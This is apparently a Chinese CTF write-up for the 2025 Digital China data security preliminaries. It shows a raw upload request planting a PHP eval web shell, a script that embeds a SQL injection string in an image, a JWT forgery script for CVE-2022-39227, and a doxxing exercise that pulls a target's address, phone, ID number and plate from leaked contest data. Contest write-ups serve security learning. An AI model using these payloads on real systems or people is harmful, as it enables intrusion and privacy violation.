+++
title = "数字中国数据安全产业积分争夺赛初赛2025"
slug = "digital-china-data-security-prelims-2025"
description = "weber只能打杂了"
date = "2025-03-30T10:41:46"
lastmod = "2025-03-30T10:41:46"
image = ""
license = ""
categories = ["赛题"]
tags = []
+++

## ez_upload

```http
POST /upload.php HTTP/1.1
Host: 47.117.188.203:33046
Content-Length: 328
Cache-Control: max-age=0
Origin: http://47.117.188.203:33046
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1GRdMZT5cLDnIgmW
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://47.117.188.203:33046/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundary1GRdMZT5cLDnIgmW
Content-Disposition: form-data; name="fileToUpload"; filename="1.phtml"
Content-Type: application/octet-stream

<?=@eval($_POST[1]);
------WebKitFormBoundary1GRdMZT5cLDnIgmW
Content-Disposition: form-data; name="submit"

上传文件
------WebKitFormBoundary1GRdMZT5cLDnIgmW--

```

没什么好说的，链接拿到flag

![1](QQ20250330-104338.jpg)

## ocr智能训练平台

发现解析图片中的文字，并且只能上传png，而且不能过大，**ClickHouse数据库**

```python
from PIL import Image, ImageDraw, ImageFont

def generate_png(text, filename='output.png'):
    # 创建一个更大的空白图像，白色背景，大小为400x200
    img = Image.new('RGB', (400, 200), color = (255, 255, 255))

    # 创建绘制对象
    draw = ImageDraw.Draw(img)

    # 选择字体和大小
    try:
        font = ImageFont.truetype("arial.ttf", 30)  # 增大字体大小
    except IOError:
        font = ImageFont.load_default()

    # 设置文本颜色
    text_color = (0, 0, 0)  # 黑色

    # 使用 textbbox 获取文本的边界框，来计算文本的宽度和高度
    bbox = draw.textbbox((0, 0), text, font=font)
    text_width = bbox[2] - bbox[0]
    text_height = bbox[3] - bbox[1]

    # 计算文本居中的位置
    position = ((400 - text_width) // 2, (200 - text_height) // 2)

    # 在图像上添加文本，居中显示
    draw.text(position, text, font=font, fill=text_color)

    # 保存PNG文件
    img.save(filename)

    print(f"PNG file saved as {filename}")

# 示例使用
generate_png("e' union all select 1 -- -", "example_large.png")

```

![1](QQ20250330-151101.jpg)

时间不够了

## api接口认证

不知道几把在干嘛

---

**侵权删：**当时的题目环境是无法获得jwt，看到NK的WP之后发现就是一个很简单的题目，在这个地方，比如说访问`/get_jwt`不能成功，但是抓包修改为`/./get_jwt`就可以获得到了，后面判断出来是**python-jwt**用CVE-2022-39227攻击

```python
from json import loads, dumps
from jwcrypto.common import base64url_encode, base64url_decode

def topic(name):
    topic = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDMzMjAzMDMsImdyb3VwaW5nIjoiZ3Vlc3QiLCJpYXQiOjE3NDMzMTY3MDMsImp0aSI6IkJVZVd4VEJUUnNmcnRPM0ZsZEhZUWciLCJuYmYiOjE3NDMzMTY3MDMsInVzZXIiOiJjaW1lciJ9.Y5lUuRh94_66y7kCcOoYeHNjp_a4fhjEU1XgIbx9XYKOXeSGF90NJEB56DOGOlRRK3XfHsDQKbk-jqp_RE20j0i20q-Uw6Ny-YZLNYBGdmw9TwesuMMtmxpEErLgiSrIPj8NTIEvUAbZ6HUpSVfAEZD-bG2lZqseMDptz9FvulbTYxRmRkS_dAN63efbB4RMSmqHqptUtRHxDzI1dPAqJM18WFfIGiok1-aIwjilrNIC-UDq-DqRkGoYTYPMphq0B7k5RSwZvYmO_nvETkYRJ8lYccP5-7fWgIqZM2WD46QY8kQ5s0yVpmwuCcaFKDmKXeSxIFJM_GR1b2uXB-34jw"
    [header, payload, signature] = topic.split('.')
    parsed_payload = loads(base64url_decode(payload))
    # print(parsed_payload)
    parsed_payload["grouping"] = name
    parsed_payload["user"] = name
    # print(dumps(parsed_payload, separators=(',', ':')))
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    print(fake_payload)
    return '{" ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"} '

topic("admincimer")
```

换上就可以得到flag

## 社工

找张华强信息

### 居住地和工作地

在数据库中找出经纬度

![1](1.jpg.png)

在高德给的json找出相近的地方

![1](2.jpg.png)

居住地：`华润国际E区`

![1](QQ20250330-154517.jpg)

工作地：`闵行区星辰信息技术园`

### 公司名称

![1](QQ20250330-152703.jpg)

`江苏博林科技有限公司`

### 手机号

![1](QQ20250330-152019.jpg)

爬取的网页放在VSCODE里面，得手机号`13891889377`

### 身份证号

并且得到身份证号`61050119980416547X`

### 车牌号

我们可以看到随便一个图片里面都有手机号，所以写个脚本来腾出来就好了

```python
import os
import pytesseract
from PIL import Image

# 设置 tesseract 可执行文件的路径（如果需要）
pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'  # 根据你的安装路径设置


def find_images_with_phone_number(directory, phone_number):
    # 遍历文件夹中的所有图片
    matching_images = []

    # 确认目录是否存在
    if not os.path.exists(directory):
        print(f"目录 {directory} 不存在！")
        return matching_images

    print(f"开始处理目录: {directory}")

    for filename in os.listdir(directory):
        # 只处理图片文件
        if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp', '.gif')):
            file_path = os.path.join(directory, filename)

            # 打印正在处理的文件名
            print(f"正在处理文件: {filename}")

            # 打开图片
            try:
                img = Image.open(file_path)
            except Exception as e:
                print(f"无法打开图片 {filename}: {e}")
                continue

            # 使用 pytesseract 提取图片中的文字
            try:
                text = pytesseract.image_to_string(img)
            except Exception as e:
                print(f"无法提取文字 {filename}: {e}")
                continue

            # 调试：打印部分提取的文本，检查 OCR 是否正确工作
            print(f"提取的文本预览: {text[:100]}")  # 打印提取文本的前100个字符

            # 检查是否包含电话号码
            if phone_number in text:
                print(f"找到包含电话号码 {phone_number} 的图片: {filename}")
                matching_images.append(filename)
            else:
                print(f"图片 {filename} 不包含指定的电话号码。")

    return matching_images


# 使用示例
directory = r'C:\Users\baozhongqi\Desktop\10.数据泄露与社会工程\10.数据泄露与社会工程\附件\某停车场泄露的数据'  # 替换为你的图片文件夹路径
phone_number = '13891889377'  # 查找包含的电话号码

matching_images = find_images_with_phone_number(directory, phone_number)

# 输出包含特定电话号码的图片
if matching_images:
    print("以下图片包含电话号码：")
    for image in matching_images:
        print(image)
else:
    print("没有图片包含指定的电话号码。")

```

![1](C802A0105AC0EC0B0163CC26D742D976.png)

`浙B QY318`

## 小结

被带飞了，感谢好哥哥们😆
